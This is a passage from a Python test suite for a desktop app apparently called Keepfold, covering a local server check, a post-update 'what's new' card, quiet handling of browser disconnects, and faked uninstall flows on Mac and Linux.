            c = http.client.HTTPConnection("127.0.0.1", port, timeout=5)
            try:
                c.request("GET", "/manage")
                code = c.getresponse().status
                break
            except (ConnectionResetError, ConnectionAbortedError, http.client.HTTPException):
                threading.Event().wait(0.1)
            finally:
                c.close()
        assert code == 200
    finally:
        s.shutdown()
        s.server_close()


# ---- What's new: shown once after an update -----------------------------------------------


@pytest.fixture
def newsfile(tmp_path, monkeypatch):
    from keepfold.app import news

    p = tmp_path / "whats_new.json"
    p.write_text(json.dumps({v: {"items": [f"item {v}"], "do": []}
                             for v in ("0.2.1", "0.2.2", "0.2.3", "0.3.0")}), encoding="utf-8")
    monkeypatch.setattr(news, "NEWS", p)
    return news


def test_whats_new_fresh_install_records_silently(newsfile, monkeypatch):
    from keepfold import taint, update

    monkeypatch.setattr(update, "current", lambda: "0.2.3")
    assert newsfile.card()["show"] == []  # nothing remembered: nothing shown
    newsfile.start()
    assert taint.config()["app"]["whats_new_seen"] == "0.2.3"
    assert newsfile.card() == {"show": [], "current": {"version": "0.2.3", "items": [
        "item 0.2.3"], "do": []}}


def test_whats_new_init_before_the_first_app_open_is_a_fresh_install(
        newsfile, tmp_path, monkeypatch):
    from keepfold import taint, update
    from keepfold.cli import _init

    monkeypatch.setattr(update, "current", lambda: "0.2.3")
    _init(tmp_path / "v")
    newsfile.start()  # the first app open, after `keepfold init` set the vault
    assert taint.config()["app"]["whats_new_seen"] == "0.2.3"
    assert newsfile.card()["show"] == []


def test_whats_new_an_existing_user_without_a_record_sees_everything_since_0_2_1(
        newsfile, tmp_path, monkeypatch):
    from keepfold import taint, update

    taint.write_config({"vault": str(tmp_path / "v")})  # set up before this card existed
    monkeypatch.setattr(update, "current", lambda: "0.2.3")
    newsfile.start()
    assert taint.config()["app"]["whats_new_seen"] == newsfile.BEFORE_NEWS == "0.2.1"
    assert [e["version"] for e in newsfile.card()["show"]] == ["0.2.3", "0.2.2"]


def test_whats_new_after_an_update_shows_the_versions_between_then_got_it(
        newsfile, app, monkeypatch):
    from keepfold import taint, update

    taint.write_config({"app": {"other": 1, "whats_new_seen": "0.2.1"}})
    monkeypatch.setattr(update, "current", lambda: "0.2.3")
    newsfile.start()  # something is remembered: left alone
    got = call(app, "GET", "/api/status")[1]["whats_new"]
    assert [e["version"] for e in got["show"]] == ["0.2.3", "0.2.2"]  # newest first, no 0.3.0
    assert got["current"]["version"] == "0.2.3"
    assert taint.config()["app"]["whats_new_seen"] == "0.2.1"  # GET changes nothing
    assert call(app, "POST", "/api/whats_new/seen", {})[0] == 200
    assert taint.config()["app"] == {"other": 1, "whats_new_seen": "0.2.3"}
    assert call(app, "GET", "/api/status")[1]["whats_new"]["show"] == []


@pytest.mark.parametrize("bad", ["not a version", 3, ["0.2.1"], None])
def test_whats_new_a_bad_record_is_ignored(newsfile, monkeypatch, bad):
    from keepfold import taint, update

    taint.write_config({"app": {"whats_new_seen": bad}})
    monkeypatch.setattr(update, "current", lambda: "0.2.3")
    assert newsfile.card()["show"] == []
    newsfile.start()  # treated as a fresh install
    assert taint.config()["app"]["whats_new_seen"] == "0.2.3"


def test_whats_new_ships_plain_entries():
    from keepfold import update
    from keepfold.app import news

    running = news._v(update.current())
    for v, e in news._entries().items():
        # a draft for the next release (ahead of this package, so never shown) may be shorter
        least = 1 if running and update.newer(news._v(v), running) else 3
        assert news._v(v) and least <= len(e["items"]) <= 6 and isinstance(e["do"], list), v
        assert all(isinstance(x, str) and x for x in e["items"] + e["do"]), v


@pytest.mark.parametrize("gone", [ConnectionAbortedError, ConnectionResetError, BrokenPipeError])
def test_a_browser_that_leaves_mid_answer_is_dropped_quietly(vault, gone):
    """Leaving a page mid-response (WinError 10053 on Windows) is no error: `_send` drops it and
    closes the connection instead of raising a traceback into app.log."""
    srv, _ = server.make_server(vault)
    try:
        h = object.__new__(srv.RequestHandlerClass)

        class Gone:
            def write(self, b):
                raise gone(10053, "aborted")
        h.wfile, h.command, h.request_version, h.close_connection = Gone(), "GET", "HTTP/1.1", False
        h.requestline, h.client_address = "GET / HTTP/1.1", ("127.0.0.1", 1)
        h._send(200, {"ok": True})
        assert h.close_connection is True
    finally:
        srv.server_close()


# ---- Uninstall Keepfold… (port Task 25) ---------------------------------------------------

@pytest.fixture
def uninstall(monkeypatch, tmp_path):
    """Fakes for every step: the shared `keepfold uninstall` steps, the Trash and pkexec."""
    from keepfold import cli
    from keepfold.app import bundle
    calls = []
    mac_app = tmp_path / "Applications" / "Keepfold.app"
    monkeypatch.setattr(update, "mode", lambda: "app")
    monkeypatch.setattr(cli, "uninstall_steps", lambda say: calls.append("steps") or False)
    monkeypatch.setattr(bundle, "app_path", lambda: mac_app)
    monkeypatch.setattr(update, "_trash", lambda p: calls.append(("trash", p)))
    monkeypatch.setattr(update, "_apt_remove", lambda: calls.append("apt") or (True, ""))
    return calls, mac_app


def test_uninstall_refused_outside_the_mac_and_linux_app(app, uninstall, monkeypatch):
    calls, _ = uninstall
    for m in ("installer", "dev"):
        monkeypatch.setattr(update, "mode", lambda m=m: m)
        st, js, _, _ = call(app, "POST", "/api/app/uninstall", {})
        assert st == 400 and "Mac and Linux app" in js["error"]
    assert calls == [] and app.jobs.cur is None


def test_uninstall_mac_trashes_the_app_and_quits(app, uninstall, monkeypatch):
    calls, mac_app = uninstall
    monkeypatch.setattr(sys, "platform", "darwin")
    call(app, "POST", "/api/app/uninstall", {})
    j = wait_job(app)
    assert j["error"] is None and j["result"]["removed"] is True, j
    assert calls == ["steps", ("trash", mac_app)]
    assert app.stop.wait(5)


def test_uninstall_mac_trash_failure_says_so_and_stays(app, uninstall, monkeypatch):
    calls, _ = uninstall

    def no_trash(p):
        raise OSError("not permitted")
    monkeypatch.setattr(sys, "platform", "darwin")
    monkeypatch.setattr(update, "_trash", no_trash)
    call(app, "POST", "/api/app/uninstall", {})
    r = wait_job(app)["result"]
    assert r["removed"] is False and "not permitted" in r["note"] and "Trash" in r["note"]
    assert not app.stop.wait(2.5)


def _user_copies() -> Path:
    copies = Path.home() / ".local" / "share" / "keepfold" / "app"
    (copies / "9.0.0").mkdir(parents=True)
    (copies / "9.0.0" / "keepfold-app").write_text("x")
    return copies


def test_uninstall_linux_apt_first_then_user_copies_and_quits(app, uninstall, monkeypatch):
    """apt first; the per-user copies (this app may run from one) go last, after apt worked."""
    calls, _ = uninstall
    monkeypatch.setattr(sys, "platform", "linux")
    copies = _user_copies()
    monkeypatch.setattr(update, "_apt_remove", lambda: calls.append(
        ("apt", copies.exists())) or (True, ""))
    call(app, "POST", "/api/app/uninstall", {})
    r = wait_job(app)["result"]
    assert r["removed"] is True and calls == ["steps", ("apt", True)]  # still there during apt
    assert not copies.exists()
    assert (Path.home() / ".local" / "share" / "keepfold").is_dir()  # only app/ goes
    assert app.stop.wait(5)


def test_uninstall_linux_cancelled_pkexec_says_run_apt(app, uninstall, monkeypatch):
    monkeypatch.setattr(sys, "platform", "linux")
    copies = _user_copies()
    monkeypatch.setattr(update, "_apt_remove", lambda: (False, "Request dismissed"))
    call(app, "POST", "/api/app/uninstall", {})
    r = wait_job(app)["result"]
    assert r["removed"] is False and "sudo apt remove keepfold" in r["note"]
    assert (copies / "9.0.0" / "keepfold-app").is_file()  # kept: Keepfold is still installed
    assert not app.stop.wait(2.5)


def test_uninstall_steps_failure_is_reported(app, uninstall, monkeypatch):
    from keepfold import cli
    monkeypatch.setattr(sys, "platform", "darwin")
    monkeypatch.setattr(cli, "uninstall_steps", lambda say: True)
    call(app, "POST", "/api/app/uninstall", {})
    assert wait_job(app)["result"]["steps_failed"] is True
